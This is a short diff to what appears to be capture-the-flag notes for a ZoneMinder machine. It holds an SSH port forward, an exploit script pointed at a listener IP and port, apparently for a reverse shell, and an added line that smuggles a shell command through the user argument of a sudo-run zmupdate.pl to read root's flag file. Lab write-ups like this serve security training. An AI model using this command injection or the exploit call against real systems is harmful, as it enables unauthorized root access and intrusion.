@@ -87,3 +87,6 @@ ssh -L 2222:127.0.0.1:8080 matthew@10.10.11.245
 
 # connection ssh zoneminder user
 python3 main.py -u http://localhost:2222 -i 10.10.14.15 -p 4444
+
+# root flag
+sudo /usr/bin/zmupdate.pl -v 1.19.0 -u ';cat /root/root.txt;'
